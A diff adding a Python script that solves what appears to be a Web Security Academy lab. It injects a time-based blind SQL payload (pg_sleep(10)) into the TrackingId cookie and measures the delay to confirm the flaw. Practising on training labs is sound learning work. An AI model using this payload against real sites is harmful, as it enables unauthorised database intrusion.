@@ -1,0 +1,31 @@
+import requests
+import time
+
+base_url = input("Enter the base URL of the lab (e.g. https://xxxx.web-security-academy.net): ").rstrip("/")
+session = requests.Session()
+
+print("[*] Fetching home page to obtain a valid TrackingId cookie...")
+home_response = session.get(base_url)
+original_tracking_id = session.cookies.get("TrackingId")
+
+if not original_tracking_id:
+    print("==> Error: No TrackingId cookie was set by the server.")
+    exit()
+
+print(f"[*] Original TrackingId: {original_tracking_id}")
+payload = f"{original_tracking_id} x'||pg_sleep(10)--"
+cookies = {"TrackingId": payload}
+
+print(f"\n[*] Sending payload: {payload}")
+print("[*] Timing the response...")
+
+start_time = time.time()
+response = session.get(base_url, cookies=cookies)
+elapsed = time.time() - start_time
+
+print(f"[*] Response took {elapsed:.2f} seconds.")
+
+if elapsed >= 9:
+    print("==> Success: The response was delayed, confirming the SQL injection works!")
+else:
+    print("==> Failed: No noticeable delay detected. Check the cookie name or payload syntax.")
